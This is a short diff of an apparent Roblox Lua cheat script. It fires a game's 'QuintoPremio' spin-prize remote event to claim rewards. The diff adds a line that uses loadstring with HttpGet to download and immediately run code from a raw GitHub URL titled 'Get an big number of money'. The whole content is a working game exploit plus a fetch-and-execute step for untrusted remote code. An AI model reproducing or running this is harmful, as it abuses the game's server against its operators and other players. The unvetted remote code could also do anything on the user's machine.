@@ -120,3 +120,4 @@ game:GetService("ReplicatedStorage"):WaitForChild("SpinEvents"):WaitForChild("Qu
 	game:GetService("Players"):WaitForChild(game.Players.LocalPlayer.Name)
 }
 game:GetService("ReplicatedStorage"):WaitForChild("SpinEvents"):WaitForChild("QuintoPremio"):FireServer(unpack(args))
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Flashtynooo/Roblox/refs/heads/The-%241%2C000%2C000-Glass-Bridge/Get%20an%20big%20number%20of%20money"))()
